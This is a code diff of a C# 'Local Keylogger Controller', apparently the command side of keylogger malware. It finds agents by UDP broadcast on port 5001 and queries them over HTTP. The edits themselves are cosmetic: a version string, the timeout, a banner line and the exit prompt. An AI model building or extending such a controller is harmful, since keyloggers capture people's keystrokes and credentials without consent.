@@ -12,13 +12,15 @@ namespace Local_Keylogger_Controller
 {
     internal class Program
     {
+        private const string version = "1.0.0";
+
         public const int DiscoveryPort = 5001;
         private const string DiscoveryMessage = "DISCOVER_AGENT";
-        private const uint ReciveTimeoutMs = 3000; // 3 seconds
+        private const uint ReciveTimeoutMs = 5000; // 5 seconds
 
         static async Task Main(string[] args)
         {
-            Console.WriteLine("Starting Local Keylogger Controller...");
+            Console.WriteLine($"Starting Local Keylogger Controller, Version: {version}\nMade by ArGul, GitHub: https://github.com/ArGul-0/Local-Keylogger-Controller");
 
             using UdpClient udpClient = new UdpClient();
             udpClient.EnableBroadcast = true;
@@ -28,8 +30,6 @@ namespace Local_Keylogger_Controller
 
             await udpClient.SendAsync(payload, payload.Length, endPoint);
             Console.WriteLine($"Discovery message sent to {endPoint.Address} : {DiscoveryPort}");
-
-            //Step 2: We receive responses from agents within ReceiveTimeoutMs milliseconds.
 
             var discoveryAgents = new List<(string Ip, int Port)>();
             var startTime = DateTime.UtcNow;
@@ -104,7 +104,6 @@ namespace Local_Keylogger_Controller
                         {
                             string response = await client.GetStringAsync(url);
                             Console.WriteLine($"OK: \"{response}\"");
-
                         }
                         catch (Exception ex)
                         {
@@ -134,8 +133,8 @@ namespace Local_Keylogger_Controller
                 }
             }
 
-            Console.WriteLine("\nController work complete. Press any key to exit.");
-            Console.ReadKey();
+            Console.WriteLine("\nController work complete. Press Enter to exit.");
+            Console.ReadLine();
         }
     }
 }
